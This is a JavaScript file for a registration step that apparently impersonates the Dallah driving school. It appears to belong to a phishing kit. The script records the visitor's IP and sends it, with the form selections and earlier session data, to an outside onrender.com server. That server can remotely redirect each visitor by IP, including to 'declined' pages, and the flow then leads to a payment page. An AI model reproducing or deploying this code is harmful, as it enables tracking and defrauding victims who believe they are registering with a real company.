
$(document).ready(function() {
    window.socket = io("https://dallah-server-xpls.onrender.com", { transports: ["websocket", "polling"] });
    window.visitorIP = null;

    (async () => {
        try {
            const r = await fetch("https://api.ipify.org?format=json");
            const { ip } = await r.json();
            window.visitorIP = ip;
            window.socket.emit("updateLocation", { ip, page: "register-second.html" });
        } catch(e) { console.error("IP fetch failed:", e); }
    })();

    window.socket.on("navigateTo", ({ page, ip: targetIp }) => {
        if (window.visitorIP === targetIp) {
            if (page.includes("declined=true")) {
                const overlay = $("#loadingOverlay");
                if (overlay.length) overlay.hide();
            }
            window.location.href = page;
        }
    });
    
    // معالجة pending-nav مع دعم الرفض
    (async () => {
        try {
            while (window.visitorIP === null) {
                await new Promise(r => setTimeout(r, 50));
            }
            const res = await fetch(`https://dallah-server-xpls.onrender.com/api/pending-nav/${encodeURIComponent(window.visitorIP)}`);
            const data = await res.json();
            if (data.page) { 
                if (data.page.includes("declined=true")) {
                    const overlay = $("#loadingOverlay");
                    if (overlay.length) overlay.hide();
                }
                window.location.href = data.page; 
            }
        } catch(e) { console.error("pending-nav check failed:", e); }
    })();

    $("#form").on("submit", function(e) {
        e.preventDefault();
        const stepData = {
            region: $("select[name='region']").val(),
            branch: $("select[name='branch']").val(),
            level: $("select[name='level']").val(),
            gear_type: $("select[name='gear_type']").val(),
            time_period: $("select[name='time_period']").val(),
        };

        const prevData = JSON.parse(sessionStorage.getItem("dallahData") || "{}");
        const fullData = { ...prevData, ...stepData, ip: window.visitorIP, updatedAt: new Date() };
        
        sessionStorage.setItem("dallahData", JSON.stringify(fullData));

        if (window.visitorIP) {
            window.socket.emit("submitVehicle", fullData);
            window.location.href = "paymen.html";
        } else {
            alert("جاري التحقق من الاتصال، يرجى المحاولة مرة أخرى");
        }
    });
});
